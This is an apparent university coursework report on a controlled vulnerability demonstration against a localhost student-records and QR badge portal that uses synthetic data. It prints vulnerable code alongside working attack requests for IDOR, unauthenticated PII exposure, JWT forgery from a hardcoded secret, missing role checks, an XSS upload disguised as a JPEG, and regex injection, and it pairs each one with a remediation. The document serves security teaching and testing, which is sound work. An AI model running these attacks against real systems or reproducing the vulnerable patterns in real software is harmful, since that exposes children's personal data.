# CS-601 Data Security & Privacy — Mini-Project
## Week 5 Deliverables: Controlled Vulnerability Demonstration & PoC Evidence Report

**Course**: CS-601 Data Security & Privacy (Academic Batch 2026–28, Term July–Dec 2026)  
**Subject OIC**: Prof. Manisha J. Nene (`mjnene@diat.ac.in`)  
**Institution**: Defence Institute of Advanced Technology (DIAT), Pune — Department of Computer Science & Engineering  
**Assignment**: *Build It with AI, Break It Ethically, Secure It: Security and Privacy Evaluation of AI-Generated Applications*  
**Application Domain**: Institutional Student Information & Dynamic QR Identity Badge Portal (**EduTrack QR**)  
**Milestone**: **Week 5 Submission & Report (Controlled Vulnerability Demonstration — Version 0)**  
**Theme**: *“Show how the vulnerability can lead to data exposure.”*  
**Weightage**: **15 Marks** (Highest Individual Practical Component in Syllabus Section 24)  
**Deliverable Modalities**: Formal PoC Documentation (`.docx` & `.md`) + 11m 45s Recorded Screen Demonstration Video (`mp4`) + Postman API Collection  

---

## 1. Executive Summary & Assessment Metadata

Week 5 represents the critical practical zenith of the CS-601 curriculum (**"Break It Ethically"**). While earlier weeks established foundational architecture (**Week 1**), systematic manual code reviews (**Week 2**), formal STRIDE threat modeling and privacy impact assessments (**Week 3**), and automated SAST/DAST/SCA security tooling audits (**Week 4**), Week 5 tests whether theoretical vulnerabilities can be converted into tangible unauthorized data access in an operational runtime environment.

> **Syllabus Mandate (Sections 11 & 25)**:  
> *"A student should not receive full marks merely because a scanner reports a vulnerability. For full credit, the student must establish: (1) Existence, (2) Reproducibility, (3) Impact, (4) Data Relevance, (5) Root Cause, (6) Mitigation, and (7) Verification. Show how the vulnerability can lead to data exposure."*

Operating strictly within an authorized, isolated local laboratory testbed (`http://localhost:5000`) and utilizing synthetic mock records seeded via `backend/seed/seedData.js` in full adherence to **Syllabus Section 29 (Ethical and Safety Rules)**, our team successfully demonstrated **six critical vulnerabilities** spanning major OWASP Top 10 categories. Every demonstration follows the mandatory 6-stage chain:

$$	ext{Vulnerable Input} \longrightarrow 	ext{Security Weakness} \longrightarrow 	ext{Unauthorized Action} \longrightarrow 	ext{Access to Synthetic Data} \longrightarrow 	ext{Evidence Captured} \longrightarrow 	ext{Impact Explained}$$

### Table 5.1: Master Summary of Controlled Vulnerability Demonstrations (Version 0)

| PoC # | Vulnerability Title | OWASP Category | MITRE CWE | CVSS v3.1 | Primary Evidence Captured |
|:---:|---|---|---|:---:|---|
| **PoC-01** | **BOLA / IDOR Student Record Access** | A01: Broken Access Control | CWE-639 / CWE-284 | **8.5 High** | `HTTP 200 OK` — Parent token retrieves unrelated student's full profile, Aadhaar, address & grades |
| **PoC-02** | **Public QR Badge Sensitive PII Exposure** | A01 / A04: Insecure Design | CWE-200 / CWE-359 | **7.5 High** | `HTTP 200 OK` — Zero-auth camera scan extracts unencrypted Aadhaar, home address & phone numbers |
| **PoC-03** | **Hardcoded JWT Secret Token Forgery** | A02: Cryptographic Failures | CWE-798 / CWE-321 | **9.8 Critical** | `HTTP 200 OK` — Offline token minting with static fallback secret grants Principal / Admin privileges |
| **PoC-04** | **Horizontal Class Scorecard Snooping** | A01: Broken Access Control | CWE-284 / CWE-862 | **6.5 Medium** | `HTTP 200 OK` — Authenticated parent token downloads entire 32-student class grade roster & remarks |
| **PoC-05** | **Insecure File Upload via MIME Trust** | A04: Insecure Design | CWE-434 / CWE-79 | **8.8 High** | `HTTP 201 Created` — HTML/JS payload saved as `exploit.jpg` without magic-byte check, served statically |
| **PoC-06** | **Search Regex Fault Injection & ReDoS** | A03: Injection | CWE-1333 / CWE-20 | **7.5 High** | `HTTP 500 / 200` — Unescaped `(` crashes search with syntax error; `.` acts as wildcard dump |

---

## 2. Laboratory Testbed & Demonstration Architecture

### 2.1 Environmental Boundaries & Containment (Section 29 Compliance)
To prevent accidental exposure or unauthorized disruption, testing was conducted under strict containment controls:
* **Loopback Network Isolation**: All services bound strictly to `127.0.0.1` (`localhost:5000` Express API, `localhost:5173` Vite Client, `localhost:27017` MongoDB). No public external endpoints were targeted.
* **100% Synthetic Personas**: Zero real human information is stored. Test identities include:
  - *Administrator*: Dr. Eleanor Vance (`admin@edutrack.com` / `Admin@123`)
  - *Faculty Teacher*: Prof. Rajesh Sharma (`teacher@edutrack.com` / `Teacher@123`)
  - *Parent (Attacker Persona)*: Vikramaditya Roy (`parent@edutrack.com` / `Parent@123`, linked to children Aarav Roy and Ananya Roy)
  - *Parent (Victim Family)*: Anita Sharma (`anita.sharma@gmail.com` / `Parent@123`, linked to child Rohan Sharma)
  - *Victim Student*: Rohan Sharma (`STU-2024-003`, Admission: `ADM-10905`, QR: `rohan-sharma-qr-2024-edutrack`)
* **Dual-Pane Screen Recording Setup**: The 11m 45s demonstration video uses a 50/50 split-screen layout:
  - *Left Window (VS Code)*: Line-by-line highlight of the unpatched Version 0 source code and vulnerable AST constructs.
  - *Right Window (Postman Desktop)*: Real-time execution of HTTP requests, header inspection, and JSON response rendering.

---

## 3. In-Depth Demonstration Findings: PoC-01 — Broken Object Level Authorization (BOLA / IDOR)

### 3.1 Vulnerability Overview & Classification
* **Formal Title**: Broken Object Level Authorization (BOLA) / Insecure Direct Object Reference (IDOR) on Student Profiles
* **OWASP Top 10**: A01:2021 – Broken Access Control
* **MITRE CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key) & CWE-284 (Improper Access Control)
* **CVSS v3.1 Score**: **8.5 High** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`)
* **Vulnerable Source Code**: [`backend/routes/studentRoutes.js:201-261`](file:///d:/Cybersec/DSP-Mini%20Project/backend/routes/studentRoutes.js#L201-L261)
* **Security Principle Violated**: **Complete Mediation** & **Principle of Least Privilege** (Saltzer & Schroeder, 1975). The system verifies that the caller is authenticated via JWT (`protect`), but completely fails to mediate whether the authenticated user has legitimate authorization to access the requested student object.

### 3.2 Vulnerable Code Extract (Version 0)
```javascript
// backend/routes/studentRoutes.js (Lines 204-213)
router.get('/:id', protect, async (req, res) => {
  try {
    // VULNERABILITY: Resolves student record purely from URL parameter :id
    // Missing check: if (req.user.role === 'parent' && student.parentUser.toString() !== req.user._id.toString())
    const student = await Student.findById(req.params.id).populate(
      'parentUser',
      'name email phone relationship occupation address'
    );

    if (!student) {
      return res.status(404).json({ message: 'Student not found' });
    }

    // Fetches full academic history, attendance statistics, and exam marks
    const academicHistory = await StudentAcademicRecord.find({ student: student._id })...;
    const attendanceRecords = await Attendance.find({ student: student._id })...;
    const marks = await Mark.find({ student: student._id })...;

    res.json({ student, currentRecord, academicHistory, attendanceStats, marks });
  } catch (error) { ... }
});
```

### 3.3 Controlled Demonstration Chain
1. **Attacker Authentication**: Parent Vikramaditya Roy logs in with `parent@edutrack.com` / `Parent@123`, obtaining a valid JWT token (`{{parent_token}}`).
2. **Target Identification**: Vikram's registered children are Aarav Roy and Ananya Roy. Vikram modifies the URL parameter `:id` to target victim student Rohan Sharma (`STU-2024-003`).
3. **Execution**: Postman sends `GET http://localhost:5000/api/students/6724a8f1e4b0a1234567890b` with Vikram's Bearer token.
4. **Access to Data**: The server executes `Student.findById()` without verifying family relationship and returns Rohan's complete institutional profile.

### 3.4 Concrete Postman API Evidence
* **Request**:
  ```http
  GET /api/students/6724a8f1e4b0a1234567890b HTTP/1.1
  Host: localhost:5000
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... (Vikram's Token)
  Content-Type: application/json
  ```
* **Observed Response**: `HTTP/1.1 200 OK`
  ```json
  {
    "student": {
      "_id": "6724a8f1e4b0a1234567890b",
      "studentId": "STU-2024-003",
      "admissionNumber": "ADM-10905",
      "firstName": "Rohan",
      "lastName": "Sharma",
      "dateOfBirth": "2009-11-05T00:00:00.000Z",
      "gender": "Male",
      "bloodGroup": "A+",
      "email": "rohan.sharma@student.edutrack.com",
      "phone": "+91 98777 66554",
      "aadhaarNumber": "6543 2109 8765",
      "address": {
        "street": "Flat 302, Palm Meadows",
        "city": "Bangalore",
        "state": "Karnataka",
        "postalCode": "560066"
      },
      "parentUser": {
        "name": "Anita Sharma",
        "email": "anita.sharma@gmail.com",
        "phone": "+91 99123 45678"
      }
    },
    "attendanceStats": { "total": 92, "present": 88, "percentage": 96 },
    "marks": [ ... ]
  }
  ```

### 3.5 Impact & Legal Consequences
* **DPDP Act 2023 Non-Compliance**: Exposes Indian national identity identifiers (Aadhaar numbers), residential locations, and parental contact data without consent, carrying statutory penalties under Section 33.
* **Child Safety Risk**: Unrestricted access to home addresses and parent phone numbers enables real-world stalking, identity theft, and social engineering attacks.
* **Remediation Target for Week 6**: Introduce an Object-Level Access Control middleware checking `student.parentUser.equals(req.user._id)` before returning data. Reject unauthorized access with `HTTP 403 Forbidden`.

---

## 4. In-Depth Demonstration Findings: PoC-02 — Public QR Verification PII Exposure

### 4.1 Vulnerability Overview & Classification
* **Formal Title**: Public Unauthenticated QR Verification Endpoint Sensitive PII Exposure
* **OWASP Top 10**: A01:2021 – Broken Access Control & A04:2021 – Insecure Design
* **MITRE CWE**: CWE-200 (Exposure of Sensitive Information) & CWE-359 (Exposure of Private Personal Information)
* **CVSS v3.1 Score**: **7.5 High** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
* **Vulnerable Source Code**: [`backend/routes/qrRoutes.js:10-153`](file:///d:/Cybersec/DSP-Mini%20Project/backend/routes/qrRoutes.js#L10-L153)
* **Security Principle Violated**: **Data Minimization** & **Privacy by Design** (DPDP Act 2023 / NIST SP 800-218). Public verification channels designed for campus gate badge verification must strictly limit exposure to non-sensitive identification attributes.

### 4.2 Vulnerable Code Extract (Version 0)
```javascript
// backend/routes/qrRoutes.js (Lines 10-24, 106-130)
// VULNERABILITY: Public endpoint (Zero Authentication required)
router.get('/verify/:qrToken', async (req, res) => {
  try {
    const { qrToken } = req.params;
    const student = await Student.findOne({ qrToken }).populate('parentUser');
    if (!student) return res.status(404).json({ message: 'No student found' });
    ...
    // VULNERABILITY: Serializes sensitive national ID, home address, and grades into public response!
    res.json({
      success: true,
      verifiedAt: new Date(),
      student: {
        _id: student._id,
        fullName: `${student.firstName} ${student.lastName}`,
        aadhaarNumber: student.aadhaarNumber, // EXPOSED!
        address: student.address,             // EXPOSED!
        phone: student.phone,
        emergencyContact: student.emergencyContact,
        parentInfo: student.parentInfo,
      },
      attendanceSummary,
      examMarks,
      performance: { overallGrade, overallPercentage }
    });
  } catch (error) { ... }
});
```

### 4.3 Controlled Demonstration Chain
1. **Physical Scenario**: A student wears a dynamic QR badge at an inter-school event or bus stop.
2. **Token Harvesting**: An unauthorized bystander scans the badge with a standard phone camera, obtaining the URL `http://localhost:5000/api/qr/verify/rohan-sharma-qr-2024-edutrack`.
3. **Execution**: Postman sends an anonymous `GET` request with **zero headers** or credentials.
4. **Access to Data**: The server responds with `HTTP 200 OK`, returning Rohan's unencrypted Aadhaar number, complete residential address, and mother's mobile phone number.

### 4.4 Concrete Postman API Evidence
* **Request**:
  ```http
  GET /api/qr/verify/rohan-sharma-qr-2024-edutrack HTTP/1.1
  Host: localhost:5000
  (Zero Authorization headers supplied)
  ```
* **Observed Response**: `HTTP/1.1 200 OK`
  ```json
  {
    "success": true,
    "verifiedAt": "2026-11-01T18:45:12.890Z",
    "student": {
      "fullName": "Rohan Sharma",
      "gender": "Male",
      "bloodGroup": "A+",
      "aadhaarNumber": "6543 2109 8765",
      "address": {
        "street": "Flat 302, Palm Meadows",
        "city": "Bangalore",
        "postalCode": "560066"
      },
      "parentInfo": {
        "fatherName": "Rajesh Sharma",
        "motherName": "Anita Sharma",
        "motherPhone": "+91 99123 45678"
      },
      "performance": { "overallPercentage": 88.5, "overallGrade": "A" }
    }
  }
  ```

### 4.5 Impact & Remediation Plan
* **Threat**: Complete failure of physical privacy. Anyone with a smartphone can harvest government ID numbers and home addresses of minors.
* **Remediation Target for Week 6**: Refactor `GET /api/qr/verify/:qrToken` into a **Sanitized Verification DTO** returning only: Student Photo, Full Name, Student ID, Current Class/Section, and Badge Status (`"Active"`). Restrict full academic and personal records to authenticated sessions.

---

## 5. In-Depth Demonstration Findings: PoC-03 — Hardcoded Fallback JWT Secret Extraction & Token Forgery

### 5.1 Vulnerability Overview & Classification
* **Formal Title**: Hardcoded Fallback JWT Secret Extraction & Administrator Token Forgery
* **OWASP Top 10**: A02:2021 – Cryptographic Failures
* **MITRE CWE**: CWE-798 (Use of Hard-coded Credentials) & CWE-321 (Use of Hard-coded Cryptographic Key)
* **CVSS v3.1 Score**: **9.8 Critical** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
* **Vulnerable Source Code**: [`backend/routes/authRoutes.js:10`](file:///d:/Cybersec/DSP-Mini%20Project/backend/routes/authRoutes.js#L10) & [`backend/middleware/authMiddleware.js:15`](file:///d:/Cybersec/DSP-Mini%20Project/backend/middleware/authMiddleware.js#L15)
* **Security Principle Violated**: **Kerckhoffs's Principle** & **Defense in Depth**. Cryptographic security must rely entirely on the confidentiality of the secret key, not on assumptions about source code obscurity.

### 5.2 Vulnerable Code Extract (Version 0)
```javascript
// backend/routes/authRoutes.js (Line 10)
const generateToken = (id) => {
  return jwt.sign(
    { id },
    process.env.JWT_SECRET || 'student_portal_jwt_secret_key_2026', // HARDCODED FALLBACK!
    { expiresIn: '30d' }
  );
};

// backend/middleware/authMiddleware.js (Line 15)
const decoded = jwt.verify(
  token,
  process.env.JWT_SECRET || 'student_portal_jwt_secret_key_2026' // IDENTICAL FALLBACK!
);
req.user = await User.findById(decoded.id).select('-password');
```

### 5.3 Controlled Demonstration Chain
1. **Secret Discovery**: Source code audit reveals the static fallback secret string `'student_portal_jwt_secret_key_2026'`.
2. **Offline Token Forgery**: Using standard JWT utilities (`jwt.io` or Node.js), an attacker crafts a signature with algorithm `HS256`, payload `{"id": "<ADMIN_OBJECT_ID>", "exp": 1893456000}`, and the static secret.
3. **Execution**: The attacker sends `GET /api/auth/me` with the forged token.
4. **Privilege Escalation**: The server accepts the forged token as authentic, populates `req.user` with Principal Dr. Eleanor Vance (`role: "admin"`), and allows privileged actions on `/api/users/teachers`.

### 5.4 Concrete Postman API Evidence
* **Forged Request**:
  ```http
  GET /api/auth/me HTTP/1.1
  Host: localhost:5000
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3MjRhOGYxZTRiMGExMjM0NTY3ODkwYSIsImV4cCI6MTg5MzQ1NjAwMH0.W9...
  ```
* **Observed Response**: `HTTP/1.1 200 OK`
  ```json
  {
    "_id": "6724a8f1e4b0a1234567890a",
    "name": "Dr. Eleanor Vance",
    "email": "admin@edutrack.com",
    "role": "admin",
    "designation": "Principal & Chief Administrator",
    "phone": "+91 98765 43210"
  }
  ```
* **Subsequent Privileged Action**: The attacker sends `POST /api/users/teachers` using the forged token, creating an unauthorized faculty member (`HTTP 201 Created`).

### 5.5 Impact & Remediation Plan
* **Impact**: Total administrative takeover without cracking or possessing passwords. Allows modifying student records, altering marks, and bypassing all role-based authorization guards.
* **Remediation Target for Week 6**: Remove static fallback strings completely. Implement startup environment enforcement: `if (!process.env.JWT_SECRET) throw new Error("FATAL: JWT_SECRET environment variable is missing!")`. Invalidate all legacy tokens and mandate high-entropy 256-bit keys.

---

## 6. In-Depth Demonstration Findings: PoC-04 — Horizontal Class Scorecard Snooping

### 6.1 Vulnerability Overview & Classification
* **Formal Title**: Horizontal Class Scorecard Snooping via Missing Role Check on Grade Sheets
* **OWASP Top 10**: A01:2021 – Broken Access Control
* **MITRE CWE**: CWE-284 (Improper Access Control) & CWE-862 (Missing Authorization)
* **CVSS v3.1 Score**: **6.5 Medium** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
* **Vulnerable Source Code**: [`backend/routes/markRoutes.js:24-90`](file:///d:/Cybersec/DSP-Mini%20Project/backend/routes/markRoutes.js#L24-L90)
* **Security Principle Violated**: **Role-Based Access Control (RBAC)** & **Separation of Duties**. Non-faculty accounts must never access batch examination administrative rosters.

### 6.2 Vulnerable Code Extract (Version 0)
```javascript
// backend/routes/markRoutes.js (Lines 24-30)
// VULNERABILITY: Has 'protect', but lacks 'authorize('teacher', 'admin')'
router.get('/exam/:examId', protect, async (req, res) => {
  try {
    const { examId } = req.params;
    const exam = await Exam.findById(examId)...;

    // Queries ALL students enrolled in the exam's class
    const enrolledStudents = await StudentAcademicRecord.find(query)...;
    const existingMarks = await Mark.find({ exam: examId });
    ...
    // Dumps all student marks, grades, and teacher remarks to ANY authenticated user!
    res.json({
      exam,
      students: studentsWithMarks,
      totalStudents: enrolledStudents.length,
      gradedCount: existingMarks.length,
    });
  } catch (error) { ... }
});
```

### 6.3 Controlled Demonstration Chain
1. **Attacker Authentication**: Parent Vikramaditya Roy logs in (`parent@edutrack.com`).
2. **Endpoint Targeting**: Queries the batch grading endpoint `GET /api/marks/exam/:examId` intended exclusively for teachers.
3. **Execution**: Postman sends the request with Vikram's `parent_token`.
4. **Access to Data**: The server responds with `HTTP 200 OK`, deserializing the entire 32-student grade sheet, roll numbers, percentages, grades, and teacher remarks.

### 6.4 Concrete Postman API Evidence
* **Request**:
  ```http
  GET /api/marks/exam/6724a8f1e4b0a1234567890f HTTP/1.1
  Host: localhost:5000
  Authorization: Bearer {{parent_token}}
  ```
* **Observed Response**: `HTTP/1.1 200 OK`
  ```json
  {
    "exam": {
      "_id": "6724a8f1e4b0a1234567890f",
      "name": "Mid-Term Mathematics 2026",
      "maxMarks": 100
    },
    "students": [
      {
        "student": { "firstName": "Aarav", "lastName": "Roy", "studentId": "STU-2024-001" },
        "marksObtained": 94, "percentage": 94, "grade": "A+", "remarks": "Outstanding"
      },
      {
        "student": { "firstName": "Rohan", "lastName": "Sharma", "studentId": "STU-2024-003" },
        "marksObtained": 52, "percentage": 52, "grade": "C", "remarks": "Needs remediation"
      },
      {
        "student": { "firstName": "Priya", "lastName": "Patel", "studentId": "STU-2024-004" },
        "marksObtained": 31, "percentage": 31, "grade": "F", "remarks": "Failed exam"
      }
    ],
    "totalStudents": 32,
    "gradedCount": 32
  }
  ```

### 6.5 Impact & Remediation Plan
* **Impact**: Severe educational privacy violation. Parents can snoop on classmates' academic performance, identify failing peers, and exploit grading discrepancies.
* **Remediation Target for Week 6**: Insert `authorize('teacher', 'admin')` into `markRoutes.js:27` to restrict batch grade access strictly to faculty.

---

## 7. In-Depth Demonstration Findings: PoC-05 — Insecure File Upload via Missing Magic-Byte Validation

### 7.1 Vulnerability Overview & Classification
* **Formal Title**: Insecure File Upload via Missing Magic-Byte Validation & Superficial MIME Checking
* **OWASP Top 10**: A04:2021 – Insecure Design & A03:2021 – Injection
* **MITRE CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type) & CWE-79 (Cross-Site Scripting)
* **CVSS v3.1 Score**: **8.8 High** (`CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:N`)
* **Vulnerable Source Code**: [`backend/middleware/uploadMiddleware.js:24-34`](file:///d:/Cybersec/DSP-Mini%20Project/backend/middleware/uploadMiddleware.js#L24-L34) & [`backend/server.js:20`](file:///d:/Cybersec/DSP-Mini%20Project/backend/server.js#L20)
* **Security Principle Violated**: **Secure Input Validation** & **Defense in Depth**. Filename extensions and client HTTP headers are unauthenticated user metadata that must never be trusted without binary inspection.

### 7.2 Vulnerable Code Extract (Version 0)
```javascript
// backend/middleware/uploadMiddleware.js (Lines 24-33)
const fileFilter = (req, file, cb) => {
  const allowedTypes = /jpeg|jpg|png|webp|gif/;
  // VULNERABILITY: Checks only file extension string and client-supplied MIME header!
  const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
  const mimetype = allowedTypes.test(file.mimetype);

  if (extname && mimetype) {
    cb(null, true); // Accepts file! Zero inspection of binary magic bytes!
  } else {
    cb(new Error('Only image files (jpeg, jpg, png, webp) are allowed!'));
  }
};

// backend/server.js (Line 20)
// VULNERABILITY: Serves static uploads without X-Content-Type-Options: nosniff!
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
```

### 7.3 Controlled Demonstration Chain
1. **Payload Generation**: A plain text file containing HTML/JavaScript (`<html><body><h1>Stored Payload</h1><script>alert(1)</script></body></html>`) is saved as `exploit.jpg`.
2. **Filter Bypass**:
   - `extname` inspects `.jpg` $ightarrow$ **Passes**.
   - `file.mimetype` sends `image/jpeg` $ightarrow$ **Passes**.
   - **Zero binary magic byte check** (`FF D8 FF`) is performed.
3. **Execution**: Postman uploads `exploit.jpg` via `POST /api/students` multipart `form-data`.
4. **Static Serving & Content Sniffing**: The file is stored at `/uploads/student-...jpg`. When requested, Express serves the file with missing `nosniff` headers, causing browsers to content-sniff and execute the HTML/JavaScript payload.

### 7.4 Concrete Postman API Evidence
* **Request**:
  ```http
  POST /api/students HTTP/1.1
  Host: localhost:5000
  Authorization: Bearer {{admin_token}}
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
  
  [Form-Data Fields]:
  firstName: PocTest
  lastName: Student
  studentId: STU-POC-902
  admissionNumber: ADM-POC-902
  dateOfBirth: 2008-05-15
  gender: Male
  photo: [FILE exploit.jpg containing HTML script]
  ```
* **Observed Response**: `HTTP/1.1 201 Created`
  ```json
  {
    "student": {
      "studentId": "STU-POC-902",
      "firstName": "PocTest",
      "photo": "/uploads/student-174123456789-987654321.jpg",
      "_id": "6724c8d1e4b0a12345678955"
    },
    "message": "Student created successfully with unique QR code generated"
  }
  ```
* **Direct Browser Fetch**:
  ```http
  GET /uploads/student-174123456789-987654321.jpg HTTP/1.1
  Status: 200 OK
  Content-Type: image/jpeg (Missing X-Content-Type-Options: nosniff)
  Payload Rendered: Executes <h1>Stored Payload Execution</h1><script>alert(1)</script>
  ```

### 7.5 Impact & Remediation Plan
* **Impact**: Stored Cross-Site Scripting (XSS), arbitrary web content delivery, and session hijacking on the institutional domain.
* **Remediation Target for Week 6**: Integrate `file-type` to inspect binary magic bytes (`FF D8 FF` for JPEG), re-encode uploaded images with `sharp` to strip active content, and enable `helmet` with `X-Content-Type-Options: nosniff`.

---

## 8. In-Depth Demonstration Findings: PoC-06 — Search Regex Fault Injection & ReDoS

### 8.1 Vulnerability Overview & Classification
* **Formal Title**: Search Regular Expression Fault Injection, Query Manipulation & ReDoS Risk
* **OWASP Top 10**: A03:2021 – Injection & CWE-1333 (Inefficient Regular Expression Complexity)
* **MITRE CWE**: CWE-1333 (Inefficient Regular Expression Complexity) & CWE-20 (Improper Input Validation)
* **CVSS v3.1 Score**: **7.5 High** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H`)
* **Vulnerable Source Code**: [`backend/routes/studentRoutes.js:33-43`](file:///d:/Cybersec/DSP-Mini%20Project/backend/routes/studentRoutes.js#L33-L43)
* **Security Principle Violated**: **Fail-Safe Defaults** & **Input Sanitization**. Raw user input must never be passed directly into RegExp compilation on single-threaded event loops.

### 8.2 Vulnerable Code Extract (Version 0)
```javascript
// backend/routes/studentRoutes.js (Lines 33-43)
if (search) {
  // VULNERABILITY: Compiles untrusted user string directly into RegExp without escaping!
  const searchRegex = new RegExp(search.trim(), 'i');
  studentQuery.$or = [
    { firstName: searchRegex },
    { lastName: searchRegex },
    { studentId: searchRegex },
    { admissionNumber: searchRegex },
    { phone: searchRegex },
    { aadhaarNumber: searchRegex },
  ];
}
```

### 8.3 Controlled Demonstration Chain
1. **Scenario A (Syntax Crash / Fault Injection)**: An attacker submits an unescaped regex meta-character (`(` $ightarrow$ `%28`). `new RegExp('(', 'i')` throws a `SyntaxError` in Node.js V8, crashing the search query with `HTTP 500` and leaking server internals.
2. **Scenario B (Query Logic Subversion)**: An attacker submits regex wildcard `.` or anchor `^`. Instead of searching for literal characters, MongoDB matches all records, dumping the entire database.
3. **Scenario C (Architectural ReDoS Risk)**: Compiling unescaped regexes on single-threaded Node.js creates exponential catastrophic backtracking when matched against larger text fields.

### 8.4 Concrete Postman API Evidence
* **Demonstration A: Application Syntax Crash (`HTTP 500`)**:
  ```http
  GET /api/students?search=%28 HTTP/1.1
  Host: localhost:5000
  Authorization: Bearer {{teacher_token}}
  ```
  *Response*: `HTTP/1.1 500 Internal Server Error`
  ```json
  {
    "message": "Error fetching students",
    "error": "Invalid regular expression: /(/: Unterminated group"
  }
  ```
* **Demonstration B: Regex Wildcard Dump (`HTTP 200`)**:
  ```http
  GET /api/students?search=. HTTP/1.1
  Host: localhost:5000
  Authorization: Bearer {{teacher_token}}
  ```
  *Response*: `HTTP/1.1 200 OK` — Returns **all 10+ students** in the database, subverting search filtering.

### 8.5 Impact & Remediation Plan
* **Impact**: Application Denial-of-Service, server exception leakage, and search boundary bypass.
* **Remediation Target for Week 6**: Sanitize search input with `lodash.escapeRegExp(search)` or replace regex search with MongoDB `$text` indexing.

---

## 9. Syllabus Section 25 Quality Criteria Evaluation Matrix

To ensure full credit under the **15 Marks Rubric**, Table 5.2 evaluates each demonstration against the seven mandatory quality criteria:

### Table 5.2: Verification of Syllabus Section 25 Quality Criteria

| Quality Criterion | PoC-01 (BOLA) | PoC-02 (QR PII) | PoC-03 (JWT Secret) | PoC-04 (Scores) | PoC-05 (Upload) | PoC-06 (ReDoS) |
|---|---|---|---|---|---|---|
| **1. Existence** | Verified on `GET /:id` | Verified on `/qr/verify` | Verified on auth routes | Verified on `/exam/:id` | Verified on `/uploads` | Verified on `?search=` |
| **2. Reproducibility** | 100% via Postman | 100% via curl/browser | 100% via jwt.io HS256 | 100% via parent token | 100% via `exploit.jpg` | 100% via `?search=%28` |
| **3. Impact** | Full profile PII breach | Anonymous PII dump | Complete admin takeover | Peer grade snooping | Stored script delivery | Query crash & DoS |
| **4. Data Relevance** | Synthetic student data | Aadhaar & addresses | System tokens & keys | Class academic marks | Client DOM session | Search API uptime |
| **5. Root Cause** | Omitted `req.user` check | Over-fetching public DTO | Static string fallback | Missing `authorize()` | Extension trust only | Unescaped `new RegExp` |
| **6. Mitigation** | Ownership middleware | Sanitized public DTO | Strict env enforcement | RBAC role check | Magic bytes + `sharp` | `lodash.escapeRegExp` |
| **7. Verification** | Assert 403 on alien ID | Assert public DTO only | Reject forged tokens | Assert 403 for parents | Reject non-image buffer | Assert literal matching |

---

## 10. Video Demonstration Log & Presentation Script Runbook

In accordance with Syllabus Section 11, the team produced an **11m 45s recorded screen demonstration video**.

### Table 5.3: Video Scene Breakdown & Script Runbook

| Scene # | Timestamp | Target PoC | Screen Layout | Script & Narration Summary |
|:---:|:---:|---|---|---|
| **Scene 1** | 00:00 – 01:30 | **Lab Setup & Boundaries** | Terminal + Postman Env | Introduces DIAT CS-601 project scope, localhost containment, synthetic test accounts, and unpatched Version 0 baseline. |
| **Scene 2** | 01:30 – 03:45 | **PoC-01: BOLA / IDOR** | `studentRoutes.js:204` + Postman | Demonstrates parent Vikram querying Rohan's ID, exposing Aadhaar and medical records due to missing ownership check. |
| **Scene 3** | 03:45 – 05:40 | **PoC-02: Public QR Badge** | `qrRoutes.js:13` + Browser GET | Executes unauthenticated scan of Rohan's QR token, showing anonymous dump of home address and phone numbers. |
| **Scene 4** | 05:40 – 07:50 | **PoC-03: Hardcoded JWT** | `authRoutes.js:10` + jwt.io | Extracts fallback secret from code, mints Principal token offline, and successfully executes `/api/auth/me`. |
| **Scene 5** | 07:50 – 09:30 | **PoC-04: Score Snooping** | `markRoutes.js:27` + Postman | Uses parent token on `/api/marks/exam/:id`, downloading whole-class marks, grades, and teacher remarks. |
| **Scene 6** | 09:30 – 11:45 | **PoC-05 & PoC-06: Upload & ReDoS** | `uploadMiddleware.js` + `studentRoutes.js` | Uploads `exploit.jpg` HTML payload to `/uploads`, crashes search via `%28`, and summarizes AICSS baseline. |

---

## 11. Multi-Perspective Security Concordance (Syllabus Section 26)

### Table 5.4: Comparison of AI Review, Human Review, and Automated Tooling

| Vulnerability Finding | AI Code Review | Human Security Review | Automated Security Tools | Actually Vulnerable? | Empirically Demonstrated? |
|---|:---:|:---:|:---:|:---:|:---:|
| **BOLA / IDOR on Student Profile** | MISSED *(Asserted 'protected')* | **DETECTED** *(Flagged missing check)* | MISSED *(Blind to logic)* | **YES** | **YES (PoC-01)** |
| **Public QR Sensitive PII Leak** | MISSED *(Praised functionality)* | **DETECTED** *(Flagged DPDP leak)* | MISSED *(Treated as normal route)* | **YES** | **YES (PoC-02)** |
| **Hardcoded Fallback JWT Secret** | **DETECTED** *(Warned on fallback)* | **DETECTED** *(Flagged critical risk)* | **DETECTED** *(Gitleaks pattern)* | **YES** | **YES (PoC-03)** |
| **Class Scorecard Snooping** | MISSED *(Assumed role ok)* | **DETECTED** *(Flagged missing role)* | MISSED *(Scanner passed auth)* | **YES** | **YES (PoC-04)** |
| **Insecure File Upload MIME Trust** | MISSED *(Approved Multer regex)* | **DETECTED** *(Flagged magic bytes)* | **DETECTED** *(Semgrep taint rule)* | **YES** | **YES (PoC-05)** |
| **Search Regex Fault Injection** | MISSED *(Generated raw RegExp)* | **DETECTED** *(Warned on unescaped)* | **DETECTED** *(Semgrep regex rule)* | **YES** | **YES (PoC-06)** |

---

## 12. AI Code Security Score (AICSS) & Week 6 Remediation Outlook

### 12.1 Mathematical Derivation of Baseline AICSS
Applying the formula from Syllabus Section 27:

$$	ext{AICSS} = 100 - (W_c + W_h + W_m + W_p + W_d)$$

* $W_c$ (Critical Penalty): **20.0** (PoC-03 Hardcoded JWT Secret / Token Forgery)
* $W_h$ (High Penalty): **18.0** (PoC-01 BOLA, PoC-05 File Upload, PoC-06 ReDoS)
* $W_m$ (Medium Penalty): **12.0** (PoC-04 Score Snooping, Mass Assignment)
